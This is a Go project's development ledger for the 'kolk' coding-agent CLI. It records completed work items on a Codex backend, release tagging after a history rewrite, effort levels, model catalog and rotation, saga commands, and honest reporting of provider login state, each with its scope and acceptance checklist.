- [x] the five hand-written tests moved onto the shape the vendor actually sends, so the suite
  stops passing on a frame that does not exist.
- [x] proven non-vacuous by mutation — disabling the nested branch fails three tests including the
  session-level classification, and the file was diffed byte-identical after reverting.
- [x] the tolerated fallback pinned by its own test rather than left implicit.
- [x] full `make check` green: **2,531 tests, 0 lint issues**, cold start 3.2 ms p50.

### S10 closed — built by one session, verified by the next

Recorded 2026-08-29. This entry exists because the work was real and the ledger did not know it: the
whole `04-subscription-backends.md` §11 S-group ran to S10 and **nothing was written here**, so the
only record was a chat transcript that had already scrolled past its own context twice.

**The session that wrote it never learned whether it worked.** It died mid-step on a vendor rate
limit — `429 · you have reached your session usage limit` from the Ollama cloud model driving it —
five minutes after writing `codex.go`. So gates 5, 6 and 7 were open on code that was complete,
wired, and entirely unexercised. "It is written and it is wired" and "it works" are different
claims, and only the first had been made.

**Two defects were sitting in it, and `make check` found both.** Neither would have failed a build
the author ran, because the author ran none.

1. `session.go` asserted `err.(*providerError)` to pull the vendor's cause into a plan-limit
   message. `Collect` returns that type bare today, so the assertion happened to work — but one
   `fmt.Errorf("…: %w")` anywhere on that path would drop the cause while leaving a message that
   still reads as complete, with the reason silently missing. That is the specific way it fails
   while still looking like it works, so it is now `errors.As` behind a test that wraps the cause
   and asserts it survives. The test fails on the old assertion.
2. `codex.go` returned `nil, nil` after a failed `json.Unmarshal`. This one is *correct* — a line
   that is not JSON is a version-manager shim announcing itself before the first frame, which
   `spec/testdata/foreign/README.md` documents as real codex output — but it was written so that
   nothing said so. It now carries the `//nolint:nilerr` with a reason that `cmd_sessions.go` and
   `cmd_uninstall.go` already use for the same deliberate skip, rather than a new spelling.

The second is worth separating from the first: one was a latent bug, the other was correct code that
could not be told apart from a bug. The gate cannot distinguish them, which is why both stop it.

**What it is, verified against the tree rather than the transcript.**
`internal/provider/agentcli/codex.go` carries `RunCodex`, `BuildCodexInvocation`, `TranslateCodex`
and `CodexBackend` with `StreamChat`/`ProviderHandle`/`Close`, plus the effort, sandbox-mode and
model-alias mapping. It is wired, not orphaned: `internal/cli/run.go:482` dispatches `case "codex"`
into `NewCodexBackendFromHandle`, `internal/provider/connector_login.go:20` gives it a login verb,
and `plans.go` / `plan_models.go` carry the ChatGPT Plus/Pro rows. Those model ids are the part
worth keeping: they were corrected against codex-cli 0.149.1 on a real ChatGPT login, where
`gpt-4.1` is refused outright — the catalogue had been advertising a model the vendor will not
serve. `codex-plain.jsonl`, `codex-tool-use.jsonl` and `codex-error.jsonl` are captured and
documented, so S10's own fixture gate is lifted.

Acceptance checklist:

- [x] `go build ./...` clean, and the changed packages green under `-race`
  (`agentcli`, `cli`, `provider`, `shell`).
- [x] the wrapped-cause test written first and observed failing for its intended reason —
  the cause dropped, not the window name.
- [x] the deliberate skip kept as behavior and made legible, matching the existing idiom rather
  than inventing one.
- [x] full `make check` green: **2,529 tests, 0 lint issues**, cold start 3.8 ms p50.

### R1.3 v1.2.1 composer release — verified detail

Scope:

- Publish `G11.4`–`G11.6` plus the provider wall, the session lock, the pollable overview, and the
  `kolk-mock` hint fix as `v1.2.1`, and move the installer badge and snapshot template with it.

What the history rewrite did, and did not do:

- `main` was force-rewritten during the 2026-08-27 session. Every commit was rehashed.
- **Corrected 2026-08-27, after the tag:** the rewrite was complete. Whoever performed it also moved
  every tag from `v1.1.7` to `v1.2.0` onto its rewritten equivalent, and the trees are byte-identical
  to the originals. On the remote, every tag is reachable from `main` and `git describe` resolves to
  `v1.2.1`.
- The tags this session first reported as orphaned were orphaned **only in this clone**. `git fetch`
  refuses to move an existing local tag without `--force`, so the local refs kept pointing at
  pre-rewrite commits that exist nowhere else. `git fetch --tags --force` resolved it entirely.
- The lesson worth keeping: a local tag is a cached opinion about a remote ref, and `--is-ancestor`
  against a stale one reports a broken repository that is not broken. Check `git ls-remote --tags`
  before concluding anything about published history.

Non-goals:

- No tag surgery on published releases; none was needed.
- No protocol-version bump, Windows artifact, or installer algorithm change.

Acceptance checklist:

- [x] `make check` green before the tag: 2022 tests, all gates.
- [x] tag `v1.2.1` points at `ce42b9c0`, its release workflow succeeds, and the signed manifest plus
  four archives pass the independent verifier.
- [x] the release is neither draft nor prerelease, and GitHub's latest redirect resolves to `v1.2.1`,
  which is what the website installer discovers.
- [x] the published notes describe the change rather than listing commit subjects.
- [x] the false orphaned-tag claim is removed from the release notes and corrected here. It survives
  in `ce42b9c0`'s commit message and in the `v1.2.1` tag annotation, which are immutable without
  force-moving a published tag — not worth it for a note this file now corrects.

### G11.4–G11.6 the composer frame, the icon, and shift+tab — verified detail

Scope:

- Draw both composer rules unbroken. The label in the middle of the opening rule said
  `kolk-<mode> · <folder>`, which the footer can say without costing a glance mid-rule.
- Open the draft with `❯` in both the persistent composer and the plain REPL, replacing `> ` and
  `kolk-<mode]>`.
- Lead the footer with the permission tier and the key that changes it: one chevron per step away
  from stopping to ask.
- Replace the three-row animated pixel sprite with a one-row icon beside a braille wheel and the
  phase word. The icon does not animate.
- Decode `CSI Z` as Shift+Tab and cycle ask → auto-approve → full-auto → ask.

Non-goals:

- No change to what any tier permits, or to the floor beneath all three. The key reaches the same
  three tiers `/permissions` already sets, and lasts exactly as long as the session.
- No colour, theme, or renderer change; no new dependency.
- No change to the approval overlay, which keeps its labelled rule and stays text-only.

Decisions worth recording:

- **Two pixel rows is the budget for a one-row icon.** Quadrant blocks carry 2x2 pixels per cell, so
  four cells is an 8x2 grid. Eyes cannot be drawn filled at that height; they are cut out of the
  dome instead, and those notches are what keep it reading as the website's octopus. Braille was
  tried first — 2x4 pixels per cell, more vertical room — and rejected: it renders as a dotted
  smudge at terminal size. Braille kept the job it is good at, which is the wheel.
- **The hint is `(shift+tab)`, not `(shift+tab to cycle)`.** Nine more columns on every row forever,
  and at 72 columns those nine are the working folder.
- **Mode, folder and the tier moved into the footer** rather than being dropped with the rule label.
  `context` and `cost` moved to the shorter row, because the tier lead had pushed the two numbers
  that decide whether to compact off a normal-width terminal.
- **The engine already reported the phase** — `thinking`, `planning`, `working`, `synthesizing` — and
  the runtime was discarding it. The activity row now says which one.

Acceptance checklist:

- [x] both rules are unbroken at every width, and the frame carries no `kolk-<mode>` label.
- [x] the icon is one row of four single-width cells; a newline or a wide rune fails a test.
- [x] only the wheel advances between frames; the octopus is byte-identical across them.
- [x] an unknown phase becomes `working` rather than reaching the lifecycle the controller reads
  back out of the row.
- [x] `CSI Z` decodes as its own key, still completes nothing, and reaches the surface with a
  completion list open.
- [x] every tier the cycle produces is one `engine.NormalizePermission` accepts.
- [x] a runtime with no cycle seam is inert rather than pretending the tier changed.
- [x] `make check` green: 2022 tests, all gates.

### E7.1 effort vocabulary normalization & canonical levels — verified detail
- [x] **G11.4 the composer frame** — the rules carry no label, `❯` opens the draft, and the tier leads
  the footer with the key that changes it.
- [x] **G11.5 the octopus at icon size** — one row, four cells of quadrant blocks, beside a braille
  wheel and the phase the engine already reports.
- [x] **G11.6 shift+tab cycles the tier** — `CSI Z` becomes a key instead of being swallowed, and the
  surface owns what the next tier is.
- [x] **R1.3 v1.2.1 composer release** — publish the composer frame, the icon and shift+tab, and
  record what the mid-session history rewrite did to the tag ancestry.

Scope:

- Establish canonical effort constants: `EffortLow` ("low"), `EffortMedium` ("medium"), `EffortHigh` ("high"), `EffortMax` ("max") in `internal/engine`.
- Implement pure function `NormalizeEffort(string) (string, bool)` supporting:
  - Canonical names: `low`, `medium`, `high`, `max`
  - Numeric aliases: `1` → `low`, `2` → `medium`, `3` → `high`, `4` → `max`
  - Legacy aliases: `quick` → `low`, `standard` → `medium`, `deep` → `high`, `ultra` → `max`
  - Case-insensitivity and whitespace trimming
- Update `Agent.SetEffort` to accept and normalize all valid inputs and return a descriptive error naming the canonical levels on failure.
- Update `Agent.modelFor` to check canonical effort keys in `Tiers` and fall back to legacy keys ("quick", "standard", etc.) if present, preserving zero-config inheritance.
- Update CLI flag help and slash help to display `<low|medium|high|max>` while continuing to accept numeric and legacy tokens.

Non-goals:

- No change to provider streaming, network protocols, or session JSON file format.
- No auto-escalation policy in this leaf (E7.2 owns that).
- No new external dependencies.

Acceptance checklist:

- [x] table-driven unit tests for `NormalizeEffort` covering all canonical, numeric, legacy, case variations, and invalid inputs.
- [x] `Agent.SetEffort` accepts canonical `low/medium/high/max`, numeric `1..4`, and legacy `quick..ultra`, storing canonical names in `a.Effort`.
- [x] `Agent.modelFor` resolves canonical tier keys and falls back to legacy tier keys if present, or base `a.Model` when unset.
- [x] CLI slash command `/effort` accepts all aliases and prints canonical effort names.
- [x] focused engine and CLI tests pass with `-race`, and full `./scripts/test.sh` remains 100% green.

### E7.2 effort knob matrix — verified detail

Scope:

- Wire tool round limits per turn via `MaxRoundsFor(mode, effort) int`:
  - `low`: 4 rounds (code) / 2 rounds (chat)
  - `medium`: 12 rounds (code) / 6 rounds (chat)
  - `high`: 24 rounds (code) / 12 rounds (chat)
  - `max`: 50 rounds (code) / 20 rounds (chat)
  - Abort runaway turns when tool calls exceed effort's round limit with descriptive error `exceeded maximum tool rounds (%d) for %s effort`.
- Wire subagent orchestration width and subagent round limits via `maxTasksFor(effort) int`:
  - `low`: 1 task (no fanout)
  - `medium`: 2 tasks
  - `high`: 4 tasks
  - `max`: 6 tasks
  - Subagent tool loops use `MaxRoundsFor(ModeCode, a.Effort)`.
- Wire bash command timeouts via `TimeoutForEffort(effort) time.Duration`:
  - `low`: 30s
  - `medium`: 120s
  - `high`: 300s
  - `max`: 600s
  - Pass context timeout to `tools.Execute` on bash tool invocations.

Non-goals:

- No auto-escalation heuristics based on model errors in this leaf.
- No provider-level thinking parameter changes (`E7.3` and provider layer own that).

Acceptance checklist:

- [x] table-driven tests for `MaxRoundsFor` covering all modes, canonical levels, and aliases.
- [x] table-driven tests for `TimeoutForEffort` covering all canonical levels and aliases.
- [x] table-driven tests for `MaxTasksForEffort` covering width mapping.
- [x] turn execution aborts when exceeding `MaxRoundsFor` with clear message.
- [x] focused engine tests pass with `-race`, and full `./scripts/test.sh` remains 100% green.

### E7.3 config & tier resolution — verified detail

Scope:

- Wire dotted keys `effort.<level>.model` into config resolution chain following `docs/plan/18-config.md`.
- Support `kolk config set effort.<level>.model <id>`, `kolk config get effort.<level>.model`, and `kolk config unset effort.<level>.model`.
- Maintain backward compatibility with `kolk config set-tier <effort> <id>` by mapping to canonical effort keys in `cfg.Tiers`.
- Ensure session initialization applies tier inheritance from config to `ag.Tiers`.

Non-goals:

- No REPL TUI dynamic status updates in this leaf (`E7.4` owns that).
- No new external dependencies.

Acceptance checklist:

- [x] unit tests prove `effort.<level>.model` config set, get, unset, and persistence.
- [x] legacy `set-tier` commands correctly populate canonical effort entries.
- [x] engine agent inherits resolved tiers on startup.
- [x] full `./scripts/test.sh` passes without regressions.

### E7.4 interactive REPL & slash surface — verified detail

Scope:

- Update persistent composer status bar in `internal/cli/tui_repl.go` to re-resolve model name immediately when `/effort` is executed.
- Ensure `/effort` slash command output reports the canonical effort name and the active model resolved from tiers.
- Add test coverage for in-session `/effort` re-resolution reflecting on TUI status.

Non-goals:

- No model auto-rotation on 429 in this leaf (M8.2 owns that).
- No new external dependencies.

Acceptance checklist:

- [x] REPL slash test proves `/effort <level|num>` updates `ag.Effort` and re-resolves active tier model.
- [x] TUI model status line renders updated model name after `/effort`.
- [x] focused CLI tests pass with `-race`, and full `./scripts/test.sh` remains 100% green.

### M8.1 catalog cache & discovery seam — verified detail

Scope:

- Implement disk-cached catalog loader `ListModelsCached` in `internal/provider/catalog.go` with 1-hour TTL (`DefaultCatalogTTL`).
- Use atomic write (`atomicfile.Write`) to save `models.json` into `d.CatalogFile()`.
- Add `--refresh` flag support in `kolk models` to bypass cache.
- Fallback to stale on-disk cache during network outages.
- Provide `FallbackCatalogSeed()` with verified bootstrap models for completely offline cold starts.
- Wire catalog cache into `kolk models` CLI and `/model` REPL slash commands.

Non-goals:

- No dynamic model ranking or auto-rotation on 429 in this leaf (`M8.2` owns that).
- No Fast Lane auxiliary slot in this leaf (`M8.4` owns that).

Acceptance checklist:

- [x] unit tests prove cache hit avoids network and serves from disk.
- [x] unit tests prove cache miss fetches and atomically writes `models.json`.
- [x] unit tests prove network failure falls back to stale cache.
- [x] unit tests prove `--refresh` bypasses cache and updates from network.
- [x] full `make check` gate passes (1,399 tests, 5 platforms clean, 0 lint issues).

### M8.2 free model ranker & auto-rotation — verified detail

Scope:

- Implement free model discovery ranker prioritizing coding competence, context length, and latency.
- Track tried models per turn to prevent ping-pong cycles.
- On HTTP 429 rate-limit error, rotate to next free ranked model and replay turn automatically if unpinned.
- Enforce the Pinned Model Invariant: never auto-rotate if the user explicitly specified the model via `-m` or `/model`.

Non-goals:

- No model aliases (`sonnet`, `haiku`, etc.) in this leaf (`M8.3` owns that).
- No new external dependencies.

Acceptance checklist:

- [x] unit tests prove free models are ranked according to coding and context criteria.
- [x] turn loop rotates to next free model on 429 and retries turn automatically.
- [x] pinned user models never auto-rotate on 429, surfacing error after standard retries.
- [x] focused engine and provider tests pass with `-race`, and full `./scripts/test.sh` remains 100% green.

Verification checkpoint 2026-08-26: free candidates are gated to zero-cost,
tool-capable models with at least 32k context; ranking is deterministic; each
unpinned free-model turn rotates through each candidate at most once. Focused
provider, engine, and CLI race tests plus `go test ./... -count=1` passed.

### M8.3 model aliases & catalog browser — verified detail

Scope:

- Map vendor shorthand aliases per `docs/plan/08-model-routing.md` §2.2 (`sonnet`, `opus`, `haiku`, `flash`, `pro`, `o3-mini`, `deepseek`, `auto`, etc.) to full provider model IDs.
- Update `kolk model <alias>` and `/model <alias>` to resolve aliases transparently.
- Implement bare `/model` browser output categorized by active model, top free models, and top frontier models.
- Add tests for alias resolution and categorized catalog rendering.

Non-goals:

- No fast lane auxiliary slot in this leaf (`M8.4` owns that).
- No new external dependencies.

Acceptance checklist:

- [x] unit tests verify all standard aliases resolve to canonical model IDs.
- [x] bare `/model` displays active model details, free highlights, and frontier highlights.
- [x] switching via `/model <alias>` resolves and sets canonical model ID.
- [x] full `./scripts/test.sh` passes without regressions.

### M8.4 fast lane auxiliary execution slot — verified detail

Scope:

- Implement isolated zero-cost auxiliary execution slot (`slot.fast`) per `docs/plan/08-model-routing.md` §3.
- Fast Lane handles asynchronous background summaries (session titling, auto-compaction summary).
- Selection rule: if main model is free, fast lane uses free model; if paid, uses cheapest high-throughput model capped at <= $0.15/1M tokens.
- Tools are disabled for fast lane calls, and turn history is isolated.
- Add tests verifying fast lane model selection, tool restriction, and context isolation.

Non-goals:

- No unified command table in this leaf (`C9.1` owns that).
- No new external dependencies.

Acceptance checklist:

- [x] unit tests prove `FastLaneModel` selection based on session model pricing.
- [x] fast lane auxiliary execution runs with empty toolset and isolated context.
- [x] focused engine and provider tests pass with `-race`, and full `./scripts/test.sh` remains 100% green.

### C9.1 unified command table & parity engine — verified detail

Scope:

- Implement unified command specification data structure in `internal/cli` following `docs/plan/09-command-surface.md`.
- Enforce exact parity rule: every CLI verb has an identical slash twin inside REPL (`kolk <verb> [args]` ≡ `/<verb> [args]`).
- Single source of truth driving flag parsing, REPL slash command routing, help text, and autocompletion.
- Add unit tests verifying command dispatch parity between CLI and REPL.

Non-goals:

- No dynamic shell completion generator in this leaf (`C9.4` owns that).
- No new external dependencies.

Acceptance checklist:

- [x] unit tests prove every CLI verb has an identical REPL slash command twin.
- [x] top-level help and REPL `/help` derive from the same canonical registry.
- [x] focused CLI tests pass with `-race`, and full `./scripts/test.sh` remains 100% green.

### C9.2 short verbs & grammar simplification — verified detail

Scope:

- Enforce rigid verb naming guardrails: strictly single word, all lowercase, <= 6 characters.
- Implement first-class top-level CLI verbs for `model`, `effort`, and `mode`.
- Support seamless alias resolution and default persistence in `~/.config/kolk/config.json`.
- Add unit tests verifying grammar constraints and top-level execution.

Non-goals:

- No stream-json emission in this leaf (`C9.3` owns that).
- No new external dependencies.

Acceptance checklist:

- [x] unit tests enforce canonical command verbs are <= 6 characters and single lowercase words.
- [x] `kolk model` lists catalog or sets default model with alias resolution.
- [x] `kolk effort` and `kolk mode` display or update default settings.
- [x] full `./scripts/test.sh` passes without regressions.

### C9.3 non-interactive scripting & stream-json — active detail

Scope:

- Implement non-interactive execution support per `docs/plan/09-command-surface.md` §3.
- Support `-p / --prompt` and piped standard input without TUI chrome or interactive prompts.
- Implement `--output stream-json` streaming line-delimited NDJSON protocol events.
- Enforce deterministic UNIX exit codes: `ExitOK` (0), `ExitError` (1), `ExitUsage` (2), `ExitBudget` (3), `ExitInterrupt` (130).
- Add unit tests for piped input, stream-json emission, and exit codes.

Non-goals:

- No dynamic shell completion generator in this leaf (`C9.4` owns that).
- No new external dependencies.

Acceptance checklist:

- [x] unit tests prove `--output stream-json` emits parseable NDJSON protocol events.
- [x] non-interactive mode reads prompt from piped stdin when `-p` is omitted or empty.
- [x] deterministic UNIX exit codes conform strictly to spec constants.
- [x] full `./scripts/test.sh` passes without regressions.

### C9.4 shell completion generator — active detail

Scope:

- Implement embedded shell completion generator per `docs/plan/09-command-surface.md` §4 (`kolk completion <bash|zsh|fish>`).
- Dynamic autocompletions for all canonical command verbs (`key`, `model`, `effort`, `mode`, `config`, `update`, `stats`, `serve`, `version`, `help`).
- Dynamic argument autocompletion for `model` (resolves cached/alias names) and `effort` (`low`, `medium`, `high`, `max`, `1..4`).
- Add tests verifying generated bash, zsh, and fish script syntax and exit codes.

Non-goals:

- No saga state machine in this leaf (`S10.1` owns that).
- No new external dependencies.

Acceptance checklist:

- [x] unit tests prove `kolk completion <bash|zsh|fish>` outputs non-empty, valid completion scripts.
- [x] generated scripts reference canonical command verbs.
- [x] full `./scripts/test.sh` passes without regressions.

### S10.1 saga state machine & artifact engine — verified detail

Scope:

- Implement core `Saga` data model and state machine per `docs/plan/10-saga-loop.md`.
- Read and write `SAGA.md` artifact with deterministic frontmatter (`schema_version: 1`, `status`, `budgets`, `gates`).
- Model chapters with atomic statuses: `PENDING`, `PLANNING`, `EXECUTING`, `VERIFYING`, `DONE`, `FAILED`, `BLOCKED`, `ABORTED`.
- Enforce progression invariant: only one active chapter at a time; verify transitions reject illegal skips.
- Add comprehensive unit tests for `SAGA.md` parsing, serialization, and state machine transitions.

Non-goals:

- No automated git checkpointer in this leaf (`S10.2` owns that).
- No new external dependencies.

Acceptance checklist:

- [x] unit tests prove `SAGA.md` parses and formats without loss.
- [x] state machine enforces strictly ordered chapter transitions.
- [x] focused engine and saga tests pass with `-race`, and full `./scripts/test.sh` remains 100% green.

### S10.2 quality gate & git checkpointer — active detail

Scope:

- Implement automatic project quality gate detection (`DetectQualityGates(repoDir string) []string`) for Go (`go vet ./... && go test ./...`), Node (`npm test`), Rust (`cargo test`), and Make (`make test` / `make check`).
- Execute verification gates before committing a chapter.
- Implement chapter-level git checkpointer creating atomic commits on green (`saga(chapter N): <summary>`) and rollbacks (`git checkout .`) on failure.
- Add tests verifying gate detection and commit-on-green execution.

Non-goals:

- No doom-loop detection in this leaf (`S10.3` owns that).
- No new external dependencies.

Acceptance checklist:

- [x] unit tests prove project quality gates are auto-detected accurately without prompts.
- [x] verified gate passes trigger automated atomic git commit.
- [x] gate failures trigger rollback and increment strike counter.
- [x] full `./scripts/test.sh` passes without regressions.

### S10.3 budget & doom-loop guardrails — active detail

Scope:

- Implement saga budget enforcement: `MaxChapters`, `CostLimit`, and `TimeoutDuration`.
- Implement the doom-loop detector: 3 consecutive failed/no-progress chapters halt the saga.
- Provide `SagaBudget` struct with `Check(state *SagaState) (StopReason, bool)` that returns the reason to stop or continues.
- Add tests verifying each stop condition fires at the correct threshold.

Non-goals:

- No CLI/slash command wiring in this leaf (`S10.4` owns that).
- No new external dependencies.

Acceptance checklist:

- [x] unit tests prove max-chapters stop fires at the threshold.
- [x] unit tests prove cost-limit stop fires at the threshold.
- [x] unit tests prove doom-loop halts after 3 consecutive failures.
- [x] full `./scripts/test.sh` passes without regressions.

### S10.4 CLI & slash command surface — verified detail

Scope:

- Register `saga` in `commandTable()` with grammar `[goal | resume | status | stop | rewind]`.
- Implement `runSaga` dispatching subcommands: `kolk saga "goal"`, `kolk saga resume`, `kolk saga status`, `kolk saga stop`, `kolk saga rewind`.
- Add `/saga` to `slashCommandTable` with identical dispatch.
- Each subcommand starts as a stub returning `usagef` or printing a status message.
- Add tests verifying verb registration, parity, and basic exit codes.

Non-goals:

- No full saga execution loop in this leaf (engine integration comes after all S10 checkpoints are wired).
- No new external dependencies.

Acceptance checklist:

- [x] `kolk saga status` returns ExitOK — `TestSagaStatusNoActiveSaga`, `TestSagaStatusPrintsSAGAArtifact`,
  and the installed `kolk saga status` both exit 0 and print `no active saga`.
- [x] `kolk saga` with no args returns usage help — `TestSagaNoArgsReturnsUsage`; the installed binary
  prints `usage: kolk saga <goal | resume | status | stop | rewind>` and exits 2.
- [x] `/saga` slash twin is registered and routes — `slash.go` dispatches `/saga` into the same
  `runSaga`, and `TestTopLevelAndSlashParity` proves the table entry.
- [x] full `./scripts/test.sh` passes without regressions — `make check` exit 0 on 2026-08-26 05:04
  (1,541 root-module tests, 5 platforms, 0 lint issues).

Verification 2026-08-26 04:55–05:05 (claude, independent of the code's author): `go test ./internal/cli
-run 'Saga|Parity' -count=1 -v` green (8 saga tests plus parity), full `make check` exit 0. The leaf's
stated non-goal still holds — `resume`, `stop`, and `rewind` are deliberate stubs and the engine's
saga loop (`internal/engine/saga_*.go`, `internal/cli/saga_adapter.go`) is not yet driven from the CLI.
That integration is the next S-series leaf, not part of S10.4.

### S10.5 saga artifact ownership & honest subcommands — verified detail

`saveSagaGoal` and `printSagaStatus` both resolved `SAGA.md` from `os.Getwd()`. Running
`kolk saga fix all tests` from `internal/cli` on 2026-08-26 04:03 therefore wrote
`internal/cli/SAGA.md` — the untracked file the previous session mistook for test output — and
`kolk saga status` from any other directory reported `no active saga` while that saga existed.

`resume`, `stop`, and `rewind` printed `no saga to resume` / `no running saga to stop` /
`no saga chapters to rewind` unconditionally. S10.4 legitimately deferred the execution loop, but a
stub that denies a saga which demonstrably exists is not a deferral, it is a wrong answer.

Scope:

- `sagaArtifactPath` walks up for `.git` and anchors the artifact at the project root; outside a
  repository it honours an ancestor's existing `SAGA.md`, and otherwise uses the working directory.
- `resume` and `rewind` read the artifact and report the real goal, status, chapter, and last
  recorded chapter, and say plainly that the loop is not wired to them yet.
- `stop` records `stopped` in the artifact and says where it stopped; a second `stop` is idempotent.
- Multi-word goals join through `strings.Join` instead of an open-coded loop.

Non-goals:

- Still no saga execution loop behind `resume` — that remains the next S-series leaf. This leaf only
  removes the false statements and puts the artifact where the project can find it.

Acceptance checklist:

- [x] red first: the goal was written into the nested directory, status from a sibling directory
  reported `no active saga`, and `resume` denied a saga that had just been created.
- [x] a goal set from `<root>/internal/cli` writes `<root>/SAGA.md` and leaves no artifact behind in
  the nested directory.
- [x] `status` from any subdirectory reads the project's artifact.
- [x] `resume` and `rewind` name the real goal; `stop` records `stopped` and is idempotent.
- [x] two pre-existing saga tests ran without an isolated working directory and wrote `SAGA.md` into
  the repository running the suite; both now `t.Chdir(t.TempDir())`.
- [x] real-binary rehearsal in a scratch repository: goal from `pkg/deep` landed at the root, status
  and resume read it from the root, stop recorded `stopped`.
- [x] `go test -race ./internal/cli` and full `make check` green.
- [x] the orphaned `internal/cli/SAGA.md` is removed; a copy is kept in the session scratchpad.

### P11 provider plans & subscription connectors — recorded detail

These leaves were implemented and pushed between 03:28 and 03:50 on 2026-08-26 without a ledger
entry. They are recorded here after the fact from the commits and their tests, and were verified by
an independent full-gate run on 2026-08-26 05:04. Retroactive recording is a one-off correction, not
a new practice: the checkpoint contract still requires the entry before the code.

Scope:

- A static provider-plan matrix (Anthropic, OpenAI, Google, xAI, Perplexity, Mistral, DeepSeek,
  Qwen, GitHub Copilot, Cohere) with case-insensitive filtering, surfaced as `kolk plans [filter]`
  and `/plans [filter]`.
- A versioned, credential-free connector manifest at `Dirs.ConnectorsFile()`, written through
  `internal/atomicfile` under an `internal/lock` advisory lock.
- A plan model catalog behind `kolk pmodels [filter]` and `/pmodels [filter]` reporting provider,
  plan, connector, model, effort levels, and `enabled` / `available` / `unsupported subscription`.
- `shell.Handover`, which attaches an unmodified provider CLI to the real `os.Stdin`/`os.Stdout`/
  `os.Stderr` for login, plus `kolk plans login <provider> <plan>` and the live `/plogin` picker.

Non-goals:

- No OAuth flow, token read, token storage, cookie access, keychain access, or credential replay of
  any kind. Kolkrabbi stays credential-blind; the provider CLI owns the login.
- No live provider account or entitlement query — the catalog is metadata, not an authoritative
  account model list.
- No Gemini subscription CLI reuse: `docs/research/subscription-auth.md` records that Gemini CLI's
  terms forbid third-party OAuth reuse, so that path stays `unsupported subscription` and Gemini
  remains API-key only.

Acceptance checklist:

- [x] plan search, connector persistence, connector status, plan model catalog, login handoff, and
  the live picker each landed with focused tests (`internal/provider/plans_test.go`,
  `connectors_test.go`, `plan_models_test.go`, `internal/cli/cmd_plans_test.go`,
  `cmd_plan_models_test.go`, `internal/shell/handover_test.go`, `internal/tui` picker tests).
- [x] the persisted manifest carries provider, plan, connector, sandbox flag, login owner, enabled
  state, and timestamp — and no credential-shaped field.
- [x] `internal/shell` remains the only package permitted to execute processes; the adapters reach
  it through `internal/arch/layers.go`-registered seams.
- [x] commits `c08c9624`, `3bf6a0e0`, `7b7ca81c`, `bb8bc9a7`, `0ea44a52`, `339001fd`, `76e58243`,
  and `dd74907d` are on `origin/main` with green CI.
- [x] **P11.6 closed 2026-08-26 05:20** — see its own detail box below.
- [x] **P11.7 closed:** a clean exit no longer claims a verified login, and the first answered turn
  confirms it.

### P11.6 terminal ownership around provider login — verified detail

The uncommitted attempt found in the worktree restored cooked mode around the handoff and put it
back afterwards. That is necessary but not sufficient: `tui.Runtime.Run` reads the terminal from a
dedicated goroutine that stays blocked in `Read` for the whole session, including while a slash
command runs on the turn goroutine. A provider CLI spawned from `/plogin` therefore competes with
Kolkrabbi for every keystroke, and the kernel hands each one to whichever reader gets there first —
the login is unusable from inside a session, with or without raw mode. The original patch is kept
verbatim at `p11.6-original-suspend-attempt.patch` in the session scratchpad.

This also matches what the owner asked for on 2026-08-26: *"we will let each provider manage the
login in another separated terminal and then kolk use that plan logged in"*.

Scope:

- `app.terminalOwned` reports whether Kolkrabbi currently owns the keyboard. `tuiRepl` sets it for
  exactly the lifetime of the TUI runtime and clears it on the way out.
- When the terminal is owned, `kolk plans login` and `/plogin` refuse to hand over. They print the
  numbered next step, including the exact `kolk plans login <provider> "<Plan>"` line to paste into
  a second terminal, and enable nothing.
- Outside a session the handover is unchanged: the provider CLI gets the real terminal.
- `SaveConnector` stamps `UpdatedAt` in UTC when the caller leaves it zero, and normalizes an
  explicit instant to UTC. The field was declared and serialized but never written, so every
  connector on disk claimed `0001-01-01T00:00:00Z`.

Non-goals:

- No cancellable terminal reader. Suspending a live TUI around a foreground child is a real
  capability, but it needs a poll-based reader in `internal/term` and belongs in its own leaf.
- No proof that the provider actually authenticated — still tracked as an open P11 box.

Acceptance checklist:

- [x] red first: `TestPlansLoginRefusesHandoverWhileKolkrabbiOwnsTheTerminal` and
  `TestSlashPlanLoginRefusesHandoverWhileKolkrabbiOwnsTheTerminal` failed by calling `handover`.
- [x] a refused in-session login writes no connector and prints the exact external command.
- [x] `kolk plans login` outside a session still hands over and still enables the connector
  (`TestPlansLoginUsesHandoverAndPersistsMetadata` unchanged and green).
- [x] `TestSaveConnectorStampsUpdatedAt` and `TestSaveConnectorPreservesAnExplicitUpdatedAt` cover
  the timestamp both ways.
- [x] test hygiene: the discarded suspend test ran `plans login` with no directory overrides and
  wrote a fake enabled `Claude Max` connector into the developer's real
  `~/.local/share/kolk/connectors.json` during `make check`. Every plan test now goes through
  `isolateConnectorState`, which sets all three `KOLK_*_DIR` overrides.
- [x] full `make check` green.

### P11.7a honest login state — verified detail

`kolk plans login` ran the provider CLI, saw exit 0, wrote `enabled: true` and printed
`Claude Max connector enabled`. A user who opens the login and quits without signing in also exits 0,
so that message asserted something Kolkrabbi had never observed. The failure it produces is the worst
kind: `kolk plans` says enabled, and the first turn fails somewhere else entirely.

Scope:

- `Connector.Verified` records the difference between "its CLI exited cleanly" and "Kolkrabbi has
  seen it answer". Absent in existing manifests, which is correct — none of them were verified.
- The login prints what it actually observed and what it will do about it.
- `kolk plans` shows `unverified` rather than `enabled`, with a footer explaining the state.
- An unverified connector is still usable. It has to be, or it could never become verified.

Non-goals:

- No probe that spends tokens to test a login, and no invented provider subcommand. What proves a
  login is a turn the user wanted anyway (P11.7b).

Acceptance checklist:

- [x] red first: login recorded no verification state and printed `connector enabled`.
- [x] a clean login records `enabled: true, verified: false` and says a clean exit is not proof.
- [x] `kolk plans` prints `unverified` and explains it; a verified connector still prints `enabled`.
- [x] real-binary rehearsal against a hand-written manifest shows the unverified state and footer.
- [x] full `make check` green.

Open question, deliberately not decided here: a connector matches on provider and CLI name, so
signing into Claude Max marks Claude Free and Claude Pro `unverified`/`enabled` too. The `claude`
binary is one CLI and the account behind it has one plan, so the status arguably describes the
connector rather than the entitlement. Deciding which it should describe is a product question for
item 24, not a fix to make silently.

### P11.7b verify on first use — verified detail

P11.7a made the unverified state honest; this closes it. `verifyingBackend` decorates a plan
provider and confirms the connector the first time it actually answers — a turn the user wanted
anyway, so verification costs nothing extra and no probe spends tokens.

The deliberate asymmetry: **a failed turn does not demote the connector.** Concluding "that error
means you are not signed in" requires matching provider error text, and a false positive would
disable a connector that works — a worse failure than the one it prevents. Kolkrabbi instead says
what it suspects, exactly once, and leaves the recorded state untouched:

```
claude has not answered successfully yet. If it is not signed in, run this in another terminal:
  kolk plans login anthropic "Claude Max"
```

Scope:

- `verifyingBackend` wraps the plan backend selected by `planBackendFor`, so both a new session and a
  live `/model` switch get it.
